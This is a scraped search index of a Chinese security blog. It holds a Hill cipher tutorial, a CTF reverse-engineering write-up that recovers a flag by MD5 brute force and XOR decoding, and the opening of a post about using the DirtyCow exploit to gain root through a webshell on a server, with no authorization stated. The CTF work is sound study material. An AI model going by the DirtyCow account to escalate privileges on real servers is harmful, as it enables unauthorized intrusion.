从上面的两个公式来看，两个都是用矩阵行列式的倒数去乘以矩阵的伴随矩阵，从而得到矩阵的逆。看上去似乎两个没什么区别，实际上，希尔密码的矩阵求逆，还需要与替换表的长度，也就是 26，进行相关的模运算，这就是两者的区别，下面会详细讲解希尔密码矩阵的求逆步骤。 这里有个很大的误区，网上找了很多篇帖子，发现大家求的都是一般的逆矩阵，包括各种CTF题也是按照一般的逆矩阵来加密或解密，不知道是出题人对希尔密码理解有误，还是说希尔密码有另一种计算方式，反正看到的 CTF 题，都不是维基百科的那种计算方式。 网上搜到的关于希尔密码的资料，也的确写的是逆矩阵这三个字，导致很容易就理解为一般的逆矩阵，也不知道为什么没有重新取一个名字，这里困惑了好久。 上面讲了一大堆理论知识，现在开始来进行密钥矩阵求逆的步骤。 Step 1 首先，需要求取密钥矩阵行列式的乘法逆。 2 x 2矩阵的行列式计算方式如下： \\[ \\begin{vmatrix} a \u0026 b \\\\ c \u0026 d \\end{vmatrix} = a \\times d - b \\times c \\] 带入密钥矩阵，结果如下： \\[ \\begin{vmatrix} h \u0026 i \\\\ l \u0026 l \\end{vmatrix} = \\begin{vmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{vmatrix} = 7 \\times 11 - 8 \\times 11= -11 \\] 将行列式的结果模 26： \\[ -11 \\equiv 15 \\mod {26} \\] 再求取其的乘法逆，乘法逆求取方式如下： \\[ d \\times d^{-1} \\equiv 1 \\mod 26 \\] 带入相应的数字，如下： \\[ 15 \\times x \\equiv 1 \\mod 26 \\] 求乘法逆可以通过枚举的方式，下面是Python代码： i = 0 while True: if 15 * i % 26 == 1: print(i) exit() i += 1 最后得到结果为7，如下： \\[ 15 \\times 7 \\equiv 105 \\equiv 1 \\mod 26 \\] Step 2 接着求取密钥矩阵的伴随矩阵。 2 x 2矩阵的伴随矩阵如下计算： \\[ adj \\begin{pmatrix} a \u0026 b \\\\ c \u0026 d \\end{pmatrix} = \\begin{pmatrix} d \u0026 -b \\\\ -c \u0026 a \\end{pmatrix} \\] 带入密钥矩阵的话，结果如下： \\[ adj \\begin{pmatrix} h \u0026 i \\\\ l \u0026 l \\end{pmatrix} = adj \\begin{pmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{pmatrix} = \\begin{pmatrix} 11 \u0026 -8 \\\\ -11 \u0026 7 \\end{pmatrix} \\] 得到结果之后，需要在负值上加上 26，以得到 0 ~ 25 之间的数字，如下： \\[ \\begin{pmatrix} 11 \u0026 -8 \\\\ -11 \u0026 7 \\end{pmatrix} = \\begin{pmatrix} 11 \u0026 -8 + 26 \\\\ -11 + 26 \u0026 7 \\end{pmatrix} \\] 最后得到结果，如下： \\[ \\begin{pmatrix} 11 \u0026 18 \\\\ 15 \u0026 7 \\end{pmatrix} \\] Step 3 最后来求密钥矩阵的逆。 得到行列式的乘法逆和伴随矩阵之后，将两者相乘的结果，再模上 26，就得到了逆矩阵，如下： \\[ 7 \\times \\begin{pmatrix} 11 \u0026 18 \\\\ 15 \u0026 7 \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \\times 11 \u0026 7 \\times 18 \\\\ 7 \\times 15 \u0026 7 \\times 7 \\end{pmatrix} \\equiv \\begin{pmatrix} 77 \u0026 126 \\\\ 105 \u0026 49 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\mod 26 \\] ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:3","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"解密 得到了逆矩阵之后，与加密步骤一样，用逆矩阵乘以密文矩阵的每一项列向量，再与 26 相模，即可得到相应的明文，如下： \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 3 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 3 \u0026 + \u0026 22 \\times 17 \\\\ 1 \\times 3 \u0026 + \u0026 23 \\times 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 449 \\\\ 394 \\end{pmatrix} \\equiv \\begin{pmatrix} 7 \\\\ 4 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} h \\\\ e \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 9 \\\\ 8 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 9 \u0026 + \u0026 22 \\times 8 \\\\ 1 \\times 9 \u0026 + \u0026 23 \\times 8 \\end{pmatrix} \\equiv \\begin{pmatrix} 401 \\\\ 193 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 14 \\\\ 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 14 \u0026 + \u0026 22 \\times 6 \\\\ 1 \\times 14 \u0026 + \u0026 23 \\times 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 482 \\\\ 152 \\end{pmatrix} \\equiv \\begin{pmatrix} 14 \\\\ 22 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} o \\\\ w \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 0 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 0 \u0026 + \u0026 22 \\times 3 \\\\ 1 \\times 0 \u0026 + \u0026 23 \\times 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 66 \\\\ 69 \\end{pmatrix} \\equiv \\begin{pmatrix} 14 \\\\ 17 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} o \\\\ r \\end{pmatrix} \\] \\[ \\begin{pmatrix} 25 \u0026 22 \\\\ 1 \u0026 23 \\end{pmatrix} \\begin{pmatrix} 23 \\\\ 24 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 23 \u0026 + \u0026 22 \\times 24 \\\\ 1 \\times 23 \u0026 + \u0026 23 \\times 24 \\end{pmatrix} \\equiv \\begin{pmatrix} 1103 \\\\ 575 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 3 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ d \\end{pmatrix} \\] 最后，密文为drjiogadxy，密钥为hill的情况下，希尔密码解密后得到的明文为helloworld。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:3:4","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"4. CTF 实战 这是XMan选拔赛的一道题，很简单，题目就一个TXT文本，打开一看，里面有一串字符串和一个矩阵，如下： \" 一看就知道是关于希尔密码的题，字符串为密文，矩阵为密钥。先求密钥矩阵的逆： \\[ 行列式：\\\\ \\begin{vmatrix} 1 \u0026 2 \\\\ 4 \u0026 7 \\end{vmatrix} \\equiv 1 \\times 7 - 2 \\times 4 \\equiv -1 \\equiv 25 \\mod 26 \\] \\[ 行列式的乘法逆：\\\\ 25 \\times x \\equiv 1 \\mod 26 \\\\ = \\\\ 25 \\times 25 \\equiv 1 \\mod 26 \\] \\[ 伴随矩阵：\\\\ adj \\begin{pmatrix} 1 \u0026 2 \\\\ 4 \u0026 7 \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 -2 \\\\ -4 \u0026 1 \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 -2 + 26 \\\\ -4 + 26 \u0026 1 \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 24 \\\\ 22 \u0026 1 \\end{pmatrix} \\] \\[ 逆矩阵：\\\\ 25 \\times \\begin{pmatrix} 7 \u0026 24 \\\\ 22 \u0026 1 \\end{pmatrix} \\equiv \\begin{pmatrix} 25 \\times 7 \u0026 25 \\times 24 \\\\ 25 \\times 22 \u0026 25 \\times 1 \\end{pmatrix} \\equiv \\begin{pmatrix} 175 \u0026 600 \\\\ 550 \u0026 25 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\mod 26 \\] 求得逆矩阵之后，再把密文转换为矩阵并分割成列向量的形式，如下： \\[ \\begin{pmatrix} h \u0026 w \u0026 h \u0026 y \u0026 c \u0026 w \u0026 b \u0026 k \u0026 b \\\\ r \u0026 d \u0026 r \u0026 g \u0026 q \u0026 d \u0026 n \u0026 l \u0026 k \\end{pmatrix} = \\begin{pmatrix} 7 \u0026 22 \u0026 7 \u0026 24 \u0026 2 \u0026 22 \u0026 1 \u0026 10 \u0026 1 \\\\ 17 \u0026 3 \u0026 17 \u0026 6 \u0026 16 \u0026 3 \u0026 13 \u0026 11 \u0026 10 \\end{pmatrix} \\\\ = \\\\ \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\begin{pmatrix} 24 \\\\ 6 \\end{pmatrix} \\begin{pmatrix} 2 \\\\ 16 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\begin{pmatrix} 1 \\\\ 13 \\end{pmatrix} \\begin{pmatrix} 10 \\\\ 11 \\end{pmatrix} \\begin{pmatrix} 1 \\\\ 10 \\end{pmatrix} \\] 开始解密，用逆矩阵乘以密文矩阵的每一个列向量并与 26 相模，得到明文，如下： \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 7 \u0026 + \u0026 2 \\times 17 \\\\ 4 \\times 7 \u0026 + \u0026 25 \\times 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 167 \\\\ 453 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 22 \u0026 + \u0026 2 \\times 3 \\\\ 4 \\times 22 \u0026 + \u0026 25 \\times 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 424 \\\\ 163 \\end{pmatrix} \\equiv \\begin{pmatrix} 8 \\\\ 7 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} i \\\\ h \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 7 \u0026 + \u0026 2 \\times 17 \\\\ 4 \\times 7 \u0026 + \u0026 25 \\times 17 \\end{pmatrix} \\equiv \\begin{pmatrix} 167 \\\\ 453 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 24 \\\\ 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 24 \u0026 + \u0026 2 \\times 6 \\\\ 4 \\times 24 \u0026 + \u0026 25 \\times 6 \\end{pmatrix} \\equiv \\begin{pmatrix} 468 \\\\ 246 \\end{pmatrix} \\equiv \\begin{pmatrix} 0 \\\\ 12 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} a \\\\ m \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 2 \\\\ 16 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 2 \u0026 + \u0026 2 \\times 16 \\\\ 4 \\times 2 \u0026 + \u0026 25 \\times 16 \\end{pmatrix} \\equiv \\begin{pmatrix} 70 \\\\ 408 \\end{pmatrix} \\equiv \\begin{pmatrix} 18 \\\\ 18 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} s \\\\ s \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 22 \\\\ 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 22 \u0026 + \u0026 2 \\times 3 \\\\ 4 \\times 22 \u0026 + \u0026 25 \\times 3 \\end{pmatrix} \\equiv \\begin{pmatrix} 424 \\\\ 163 \\end{pmatrix} \\equiv \\begin{pmatrix} 8 \\\\ 7 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} i \\\\ h \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 1 \\\\ 13 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 1 \u0026 + \u0026 2 \\times 13 \\\\ 4 \\times 1 \u0026 + \u0026 25 \\times 13 \\end{pmatrix} \\equiv \\begin{pmatrix} 45 \\\\ 329 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\\\ 17 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} t \\\\ r \\end{pmatrix} \\] \\[ \\begin{pmatrix} 19 \u0026 2 \\\\ 4 \u0026 25 \\end{pmatrix} \\begin{pmatrix} 10 \\\\ 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 19 \\times 10 \u0026 + \u0026 2 \\times 11 \\\\ 4 \\times 10 \u0026 + \u0026 25 \\times 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 212 \\\\ 315 \\end{pm","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:4:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"5. 其他问题 密钥需设置为可逆的 矩阵有不可逆矩阵。作为密钥矩阵，如果不可逆的话，那么将无法进行解密。所以在定义密钥之前，需要判断该密钥是否可逆，一般的方法是利用密钥矩阵的行列式，当行列式不为 0，并且与替换表长度互质的情况下，该密钥才可用来解密。拿上面的hill举例，如下： \\[ \\begin{vmatrix} h \u0026 i \\\\ l \u0026 l \\end{vmatrix} \\equiv \\begin{vmatrix} 7 \u0026 8 \\\\ 11 \u0026 11 \\end{vmatrix} \\equiv 7 \\times 11 - 8 \\times 11 \\equiv -11 \\equiv 15 \\mod 26 \\] 求得的结果为 15，15 满足不为 0 的要求，并且也与 26 互质，所以该密钥可以用来解密。 如果设置密钥为不可逆的密钥，会发生什么情况呢？例如设置密钥为fcdj，转换为矩阵为： \\[ \\begin{pmatrix} 5 \u0026 2 \\\\ 3 \u0026 9 \\end{pmatrix} \\] 它的行列式如下： \\[ \\begin{vmatrix} 5 \u0026 2 \\\\ 3 \u0026 9 \\end{vmatrix} \\equiv 5 \\times 9 - 2 \\times 3 \\equiv 39 \\equiv 13 \\mod 26 \\] 得到行列式为 13，而 13 与 26 并不互质，因为他们存在两个公约数：1、13 用该矩阵来加密没任何问题，问题会出现在解密上。在解密的时候，用该矩阵求逆矩阵时，在求行列式的乘法逆的地方就会卡住，是找不到相应的乘法逆的，如果不相信的话，可以用脚本跑一跑。 找不到乘法逆，也就找不到解密用的逆矩阵，也就解不了密。所以在设置密钥的时候，一定要先用上面的公式来确认密钥是否为可逆的。 替换表与 26 关于替换表与 26 这个数字，得提一提。 替换表不一定得是按照顺序排列的 26 个字母，也可以打乱顺序排列，甚至可以不用字母，用中文当替换表也是可以的，只是相应的计算都得根据替换表发生变化而已。例如替换表换成下面这样，一样可以进行加解密： \\[ \\begin{array}{cc} h \u0026 e \u0026 l \u0026 l \u0026 o \u0026 w \u0026 o \u0026 r \u0026 l \u0026 d \\\\ 0 \u0026 1 \u0026 2 \u0026 3 \u0026 4 \u0026 5 \u0026 6 \u0026 7 \u0026 8 \u0026 9 \\end{array} \\] 而 26 这个数字，在文中使用 26 来与其他表达式进行计算，是因为替换表刚好有 26 个字符。这个 26 是根据替换表的长度来的，例如上面的替换表，如果要进行相应的计算，那应该将 26 换成 10 才对。 明文与密钥的填充事项 在前面我们提到了关于明文的长度不够填充矩阵和密钥的长度大于或小于矩阵的填充长度的相关问题，这个问题网上搜索了很多资料，没有统一的答案。有的说将 0 作为填充物，有的说将 E 作为填充物，说啥的都有。 在这里我觉得，填充什么都没有关系，这个可以自定义的，但是加解密时必须一致，例如加密时填充的是 x，那么解密时也应该填充 x，所以这个地方只需要加解密保持一致，填充什么字符都无所谓。 网上的希尔密码资料 网上看了很多关于希尔密码的资料，水平参差不齐，特别是前面提到的关于解密时的逆矩阵计算方法，各种各样的解法都有。国内的资料，说实话水平的确要差些，对比一下中英文的希尔密码的维基百科，那简直一个天上一个地下。所以如果需要深入学习希尔密码的相关知识，建议搜索英文版的资料进行学习。 逆矩阵相关问题 对于解密时的逆矩阵，研究了一下，发现当密钥矩阵的一般逆矩阵，也就是用 $ A^{-1} = { \\frac {A^{*}}{|A|} } = { \\frac 1{|A|} } \\times A^{*} $ 公式求出来的逆矩阵，它的每一个值都为整数时，该密钥矩阵就可以用一般逆矩阵的方式来解密密文，比如上面的 CTF 例子，它的一般逆矩阵是这样的： \\[ \\begin{pmatrix} 1 \u0026 2 \\\\ 4 \u0026 7 \\end{pmatrix} ^{-1} = \\begin{pmatrix} -7 \u0026 2 \\\\ 4 \u0026 -1 \\end{pmatrix} \\] 用这个逆矩阵对密文矩阵的每一个列向量进行相乘并取模 26，可以发现也能求出明文，下面是一个列向量的例子： \\[ \\begin{pmatrix} -7 \u0026 2 \\\\ 4 \u0026 -1 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} -7 \\times 7 \u0026 + \u0026 2 \\times 17 \\\\ 4 \\times 7 \u0026 + \u0026 -1 \\times 17 \\\\ \\end{pmatrix} \\equiv \\begin{pmatrix} -15 \\\\ 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] 通过这种方式解出来的答案和之前用的方式解出来的答案是一模一样的。当然，如果你觉得这是巧合的话，可以设置密钥为bcab，转换成矩阵就为： \\[ \\begin{pmatrix} 1 \u0026 2 \\\\ 0 \u0026 1 \\end{pmatrix} \\] 而对应的逆矩阵为： \\[ \\begin{pmatrix} 1 \u0026 2 \\\\ 0 \u0026 1 \\end{pmatrix} ^{-1} = \\begin{pmatrix} 1 \u0026 -2 \\\\ 0 \u0026 1 \\end{pmatrix} \\] 可以看到逆矩阵中的值都为整数，用该密钥来进行加密，也是可以解密出来的，并且用两种方式解出来的答案是一致的。 对于这个为什么会这样，实在是没找到答案，加上自己的数学功底不好，想不明白这问题。但是，需要提的一点就是，许多 CTF 题都是考的这样的希尔密码加解密，很容易就让大家误以为希尔密码就该这样解，我觉得这点不太好。 我还是觉得第一种方式的加解密是最规范的，这一种感觉像是走后门似的，主要吧，这后门还时通时不通，万一要是遇到逆矩阵中的值存在分数的呢，这个方式就完全解不了。 ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:5:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"6. END 这篇文章终于写完了，零零散散的写了将近半个月，可算是把它给写完了。其实理解透了这个密码算法原理就没那么难写了，之前因为一些垃圾文章，导致一直没彻底理解到该密码算法的原理，弄得一直写写删删的。所以学这种东西还得看国外的文章，即使看不懂英文，用 Google 翻译机翻都比国内的大多数文章写的好。当然这篇文章写得可能也有一些错误，如果各位大大发现哪有不正确的，望不吝赐教。 参考链接 讲解最完整的希尔密码理论：https://crypto.interactive-maths.com/hill-cipher.html 矩阵计算器： https://matrix.reshish.com/zh/inverse.php https://www.shuxuele.com/algebra/matrix-calculator.html https://zs.symbolab.com/solver/matrix-multiply-calculator 希尔密码在线工具： https://www.tooleyes.com/app/hill_cipher.html http://www.atoolbox.net/Tool.php?Id=914 公倍数，公约数在线计算器： https://www.osgeo.cn/app/s1770 文中 CTF 题目文件：CRYPTO-HILL.zip ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:6:0","tags":["密码学"],"title":"关于希尔密码的简单研究","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"某个周末，公司群里发了个某CTF的逆向题，刚好没啥事就尝试做一下。 ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:0:0","tags":["逆向"],"title":"某CTF一道逆向题分析","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":["CTF"],"content":"详情分析 首先，先运行看看情况，打开程序之后提示找不到VCRUNTIME140_1.dll，如下： \" 在此链接下载vcruntime140_1.dll，并将其放到C:\\Windows\\System32\\目录下，再次打开程序，可以看到是个控制台程序，并且需要输入，如下： \" 注意 Win7下才会缺失vcruntime140_1.dll，Win10下不受影响 接着查壳，看看是否加壳，使用LoadPE查看区段，发现区段正常，并无异常，应该是没有壳的，如下： \" 接下来用x64dbg打开程序，并且搜索字符串，如下： \" 可以看到如下字符串： \" 猜测应该是输入特定的字符串，然后对输入一顿加密，最后比较加密后的结果是否与程序内设定的一致，一致则提示找到flag，否则就退出啥的。 接下来再用IDA打开程序，找到main函数，看下流程图，如下： \" 看到这种的时候，就是 IDA关闭 ==\u003e 虚拟机关闭 ==\u003e 爱奇艺打开。追了会剧，吃了个饭，想了想，还是分析分析吧，毕竟还是想装装逼学习学习的。 整个程序分成以下几块： 获取输入 判断输入是否合法 判断第二段字符串是否正确 判断第一段字符串是否正确 判断第三段字符串是否正确 完 获取输入： IDAf5 大法之后，从104 ~ 155行，是获取输入，如下(请忽略小学鸡的注释😂)： \" 上图中，标注了两处地方，这两处地方是这个获取输入的地方最重要的地方，下面详细分析。 首先看第二处，第二处比较简单，也就是这个输入怎么结束。这里的逻辑是判断输入的字符是否为#号，当输入了3个#号之后，循环结束，完成输入。 再来看第一处，这里比较复杂。 if判断的是两个全局变量，这两个变量一开始都为0，然后开始执行sub_140001F60函数，该函数会将输入的字符存放在某个数组中，并且给三个变量赋值。 变量1为存放字符的数组首地址。变量2为该数组+1的地址，其实也就是输入字符串的长度，变量2 - 变量1 = 输入字符串长度。变量3不知道存放的是什么地址，它要么与变量2相等，要么比变量2大一些。 而if判断的就是变量2和变量3，当相等时就去执行sub_140001F60函数，不相等时则将变量2+1。 这里最主要就是变量3的变化，经测试，变量3的变化主要与输入的字符长度有关，具体如下： 输入字符长度 变量3的值 1 ~ 4 变量2+0，也就是字符串实际长度 5 ~ 6 变量2+1，也就是字符串实际长度+1 7 ~ 9 变量2+2，也就是字符串实际长度+2 10 ~ 13 变量2+3，也就是字符串实际长度+3 14 ~ 19 变量2+5，也就是字符串实际长度+5 20 ~ 28 变量2+8，也就是字符串实际长度+8 … … 可以看出点端倪了，这应该是斐波那契数列。当字符串长度大于等于 5 时，就将变量2按照斐波那契数列依次累加，并且赋值给变量3。 从这个获取输入的位置，可以得出以下结论： 输入的字符串，包含3个#号 输入的字符串长度应该有所限制 判断输入是否合法： 当接受完输入的字符串之后，接下来就是判断输入是否合法了，从这个标题应该就能看出，这个输入字符串是有格式的，我们接着来分析。 从156 ~ 162行，是在进行输入合法性校验，代码如下： \" 这里也有两处比较重要的点。 第一处判断几个全局变量相加相减之后的值是否等于37，不等于直接退出。这几个变量就是上面分析的变量1与变量3，只不过有三组变量1与变量3。为什么有三组呢，因为前面输入的位置每遇到一个#号，就进行一组的变量操作，三个#号刚好三组。用每一组的变量3 - 变量1，也就是将斐波那契数列处理过的数 - 字符串首地址，得到的差值再相加，必须等于37。下面是输入字符串长度与变量3的关系，也就是上面的完善版： 输入字符长度 变量3与变量2的关系 最终的差值 1 ~ 4 变量2+0，也就是字符串实际长度 字符串实际长度 5 ~ 6 变量2+1，也就是字符串实际长度+1 6 7 ~ 9 变量2+2，也就是字符串实际长度+2 9 10 ~ 13 变量2+3，也就是字符串实际长度+3 13 14 ~ 19 变量2+5，也就是字符串实际长度+5 19 20 ~ 28 变量2+8，也就是字符串实际长度+8 28 … … 从这个表格中可以看到，要想满足37的标准，最简单得是28+9，如果这样得话那么一段字符串为20 ~ 28位，一段字符串为7 ~ 9位。 第二处，是三个变量相比较，也就是三段字符串的长度，比较结果是第二段字符串长度最长，其次是第一段，最后是第三段。 从这个地方可得出以下结论： 输入为一段包含3个#号的字符串，刚好分成3段字符串，第二段字符串最长，其次是第一段，最后是第三段。 按照上面这个长度划分，再结合相加得为37来看，第二段字符串应该在20 ~ 28位之间，第一段和第三段加起来为9，且第一段大于第三段。 判断第二段字符串是否正确： 接着是判断第二段字符串是否正确，代码为163 ~ 189、410 ~ 414行。 先是执行410 ~ 414行，这里这个while循环，是遍历输入的第二段字符串，判断每个字符是否等于1或者等于2，不等于这两个直接退出，代码如下： \" 接着就是163 ~ 189行，将第二段字符串进行MD5哈希，并且判断是否与39c1ca4b6d64c40558425432c11624a8相等，不相等则退出，代码如下： \" 从这里得到结论： 第二段字符串必须由1、2组成 MD5后必须等于39c1ca4b6d64c40558425432c11624a8 在这里将39c1ca4b6d64c40558425432c11624a8放入到网上的彩虹表查询，都没有查询到结果。由于只由两个字符组成，这里直接采取暴力破解的方式，来找到对应的字符串，代码如下： import hashlib import itertools for i in range(1,33): for i in itertools.product('12',repeat=i): data = bytes(\"\".join(i),'utf8') md5str = hashlib.md5(data).hexdigest() # 1221222221212121211122112111 if md5str == '39c1ca4b6d64c40558425432c11624a8': print('it\\'s find!') print('str:%s, md5str:%s'%(data, md5str)) exit() 最后找到1221222221212121211122112111，如下： \" 最终结论： 第二段字符串为1221222221212121211122112111 最终字符串为：?#1221222221212121211122112111#? 判断第一段字符串是否正确： 然后判断第一段字符串是否正确，这里的代码就比较长了，主要点在下图： \" 主要逻辑为先定义了一个加密字符数组，然后取数组内容相加，并与输入的字符一个一个异或，得到的结果再与当前字符所在的下标进行异或，最后将异或后的结果与定义的字符相比较，其中一个字符不相等则退出。 这里我用的笨办法，因为本来剩余的字符就不多了，所以我直接动态调试找到异或的加密字符，然后与正确字符异或就得到了输入的字符串，代码如下： a = 'F4 F3 D2 EE 8B A1 77 99'.split(' ') # 正确字符 b = 'A6 91 E4 D9 EC F6 F6 1A'.split(' ') # 加密字符 for i in range(0,6): i1 = int(a[i],16) i2 = int(b[i],16) print(chr(i1^i2^i),end='') # 将三者异或回去就得到了输入的字符 得到的结果为Rc44cR： \" 可以看到，输入的字符有乱码，说明第一段字符串肯定不是9，那就可以用3+6的组合来实现，也就是第一段字符长度为6，第二段字符长度为3，这样既能满足37(6+28+3)的要求，又能满足第一段字符长度 \u003e 第三段字符长度 \u0026\u0026 第一段字符长度 \u003c 第二段字符长度的要求，所以最后第一段字符串为Rc44cR。 这里如果用3+6的方法的话，根据上面表格总结出的关系，第一段字符串也可以是5个字符，所以这里可能有两种答案。 总结： 第一段字符串长度为6，正确答案是Rc44cR 完整字符串为：Rc44cR#1221222221212121211122112111#? 判断第三段字符串是否正确： 第三段字符串判断逻辑，与第一段字符串判断逻辑类似，只是字符串长度变短了，并且最后异或比较的时候，没有与字符所在下标进行异或了，所以代码如下： a = '66 02 55'.split(' ') # 正确字符 b = '32 41 13'.split(' ') # 加密字符 for i in range(0,3): i1 = int(a[i],16) i2 = int(b[i],16) print(chr(i1^i2),end='') # 将两者异或回去就得到了输入的字符 得到结果为TCF： \" ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:1:0","tags":["逆向"],"title":"某CTF一道逆向题分析","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":["CTF"],"content":"最终结果 最终的输入字符串为：Rc44cR#1221222221212121211122112111#TCF#，由于上面的表格总结的关系，以及CTF已经关闭的缘故，没办法验证Flag是否正确，字符串也可能是Rc44c#1221222221212121211122112111#TCF#。执行结果如下： \" ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:2:0","tags":["逆向"],"title":"某CTF一道逆向题分析","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":["CTF"],"content":"END 第一次写 CTF 逆向题的WriteUp，写得比较啰嗦，而且太久没搞逆向了，可能有些地方分析得也不对，如发现有任何错误，欢迎与我联系。 相关链接 相关文件：cpp.exe_WP.zip ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:3:0","tags":["逆向"],"title":"某CTF一道逆向题分析","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":null,"content":"关于博客 个人博客，佛系更新，欢迎打扰 ","date":"2020-04-08","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":["杂七杂八"],"content":"This is my first hugo blog paper. ","date":"2020-04-08","objectID":"/2020/04/hello-hugo/:0:0","tags":[],"title":"Hello,Hugo","uri":"/2020/04/hello-hugo/"},{"categories":["有趣的渗透测试"],"content":"一次Linux提权的实战经历","date":"2019-06-12","objectID":"/2019/06/dirtycow/","tags":["提权","渗透经历"],"title":"DirtyCow(脏牛)漏洞之实战","uri":"/2019/06/dirtycow/"},{"categories":["有趣的渗透测试"],"content":"1. 前言 这篇文章是小伙伴拿下了webshell，但因为是Linux服务器，一直提不了权，于是叫我看看。我通过DirtyCow(脏牛)漏洞拿到了管理员权限，由于是第一次接触DirtyCow(脏牛)漏洞，所以记录下了这篇文章。 